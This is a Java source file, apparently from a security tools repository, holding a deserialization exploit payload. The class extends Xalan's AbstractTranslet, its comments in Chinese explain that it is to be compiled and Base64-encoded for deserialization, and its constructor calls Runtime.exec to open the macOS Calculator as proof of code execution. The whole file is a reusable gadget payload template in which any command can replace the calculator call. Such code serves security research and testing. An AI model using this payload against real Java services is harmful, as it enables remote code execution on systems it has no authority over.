package com.snowsec0.tools;
/*
 * 待反序列换的对象，构造函数启动MAC计算器
 * 通过javac编译Java文件，将Calc.class进行BASE64编码
 * 
 */
import java.io.IOException;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

//需要继承AbstractTranslet，否则反序列换会失败
public class Calc extends AbstractTranslet{

	public Calc()
	{
		try {
			Runtime.getRuntime().exec("open /Applications/Calculator.app");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	@Override
	public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
			throws TransletException {
		// TODO Auto-generated method stub
		
	}
	
	public static void main(String[] args)
	{
		Calc calc = new Calc();
	}
	
}
